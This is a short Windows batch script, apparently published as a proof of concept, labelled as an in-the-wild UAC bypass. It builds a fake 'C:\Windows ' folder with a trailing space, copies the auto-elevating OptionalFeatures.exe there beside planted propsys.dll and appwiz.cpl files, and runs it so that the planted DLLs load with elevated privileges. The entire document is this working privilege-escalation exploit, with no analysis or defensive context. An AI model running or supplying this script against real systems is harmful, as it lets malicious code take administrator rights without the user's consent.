@echo off
echo.
echo #### UAC Bypass In The Wild By @404death ####
mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"
echo  [+] file copying ...
copy "C:\Windows\System32\OptionalFeatures.exe" "C:\Windows \System32\"
echo  [+] file copying ...
copy "propsys.dll" "C:\Windows \System32\"
echo  [+] file copying ...
copy "appwiz.cpl" "C:\Windows \System32\"
"C:\Windows \System32\OptionalFeatures.exe"
echo  [-] UAC Bypassed ?
